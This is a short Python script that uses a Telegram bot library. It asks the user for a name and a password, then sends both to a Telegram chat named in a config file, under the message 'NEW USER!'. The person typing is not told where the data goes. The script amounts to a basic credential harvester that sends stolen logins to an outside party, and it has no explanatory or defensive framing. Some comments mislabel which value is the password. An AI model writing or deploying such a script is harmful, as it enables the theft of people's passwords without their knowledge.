import telebot #telebot
from telebot import types
import config # config file
bot = telebot.TeleBot(config.TOKEN)
Reg = [] #list
Log = [] #list
InpReg = input("Write your name: ") #bot input
InpLog = input("Write your password: ") #bot input
Reg.append (InpReg) #list add bot input
Log.append (InpLog) #list add bot input
bot.send_message(config.CHAT_ID,"NEW USER!") #MESSAGE (NEW USER!)
bot.send_message(config.CHAT_ID,"login - ") #MESSAGE LOGIN
bot.send_message(config.CHAT_ID, Reg) #PASSWORD
bot.send_message(config.CHAT_ID,"password - ") #MESSAGE PASSWORD
bot.send_message(config.CHAT_ID, Log) #PASSWORD